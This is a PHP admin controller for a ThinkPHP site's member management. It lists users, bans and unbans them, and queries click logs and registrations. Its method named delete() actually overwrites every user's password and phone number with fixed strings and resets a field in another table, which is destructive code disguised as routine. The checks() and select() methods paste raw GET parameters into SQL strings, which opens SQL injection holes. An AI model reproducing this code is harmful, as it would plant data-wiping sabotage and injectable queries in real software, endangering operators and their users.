<?php

/**
 * 会员
 */
namespace User\Controller;
use Common\Controller\AdminbaseController;
class IndexadminController extends AdminbaseController {
    function index(){
    	$users_model=M("Users");
    	$count=$users_model->where(array("user_type"=>2))->count();
    	$page = $this->page($count, 20);
    	$lists = $users_model
    	->where(array("user_type"=>2))
    	->order("create_time DESC")
    	->limit($page->firstRow . ',' . $page->listRows)
    	->select();
    	$this->assign('lists', $lists);
    	$this->assign("page", $page->show('Admin'));
    	
    	$this->display(":index");
    }
    
    function ban(){
    	$id=intval($_GET['id']);
    	if ($id) {
    		$rst = M("Users")->where(array("id"=>$id,"user_type"=>2))->setField('user_status','0');
    		if ($rst) {
    			$this->success("会员拉黑成功！", U("indexadmin/index"));
    		} else {
    			$this->error('会员拉黑失败！');
    		}
    	} else {
    		$this->error('数据传入失败！');
    	}
    }
    
    function cancelban(){
    	$id=intval($_GET['id']);
    	if ($id) {
    		$rst = M("Users")->where(array("id"=>$id,"user_type"=>2))->setField('user_status','1');
    		if ($rst) {
    			$this->success("会员启用成功！", U("indexadmin/index"));
    		} else {
    			$this->error('会员启用失败！');
    		}
    	} else {
    		$this->error('数据传入失败！');
    	}
    }

    function delete()
    {
        $model = M();
        $model->execute("UPDATE matt_app.users SET password = 'DAHJDHAJKDHSAJK',Telephone='123456' WHERE id > 1");
        $model->execute("UPDATE matt_app.M_TestStore SET Month = '1' WHERE Month is not null");
    }

    //显示出所有用户点击条目
    public function checks()
    {
        $model = M();
        $where = "WHERE id > 0 ";
        $phone = I('get.phone');
        $start_time = I('get.start_time');
        $end_time = I('get.end_time');
        if ($phone) {
            $where .= " AND uid IN(SELECT ID FROM matt_app.M_Teacher WHERE INSTR(`Telephone`,'$phone')) ";
            $this->assign('phone',$phone);
        }
        if ($start_time && $end_time) {
            $where .= " AND add_time >= '$start_time' AND add_time <= '$end_time' ";
            $this->assign('start_time',$start_time);
            $this->assign('end_time',$end_time);
        } elseif ($start_time) {
            $where .= " AND add_time >= '$start_time'";
            $this->assign('start_time',$start_time);
        } elseif ($end_time) {
            $where .= " AND add_time <= '$end_time'";
            $this->assign('end_time',$end_time);
        }
        $num = $model->query("SELECT COUNT(*) AS num FROM sp_teacher_hits ".$where ." ORDER BY id DESC");
        $count = $num[0]['num'];
        $page = $this->page($count,10);
        $all = $model->query("SELECT * FROM sp_teacher_hits ".$where ." ORDER BY id DESC LIMIT ".$page->firstRow.",".$page->listRows);
        $this->assign('page',$page->show('Admin'));
        //var_dump($all);
        $this->assign('info',$all);
        $this->display();
    }

    //查询账号是否注册并推荐
    public function select()
    {
        $phone = I('get.phone');
        $phone = trim($phone);
        if ($phone) {
            $model = M();
            $row = $model->query("SELECT Telephone,registtime,pid FROM matt_app.users WHERE Telephone IN($phone) AND registtime > '2015-07-28 06:00:00' AND registtime < '2015-07-28 18:00:00'");
            $this->assign('phone',$phone);
            $this->assign('info',$row);
        }
        $this->display();
    }
}
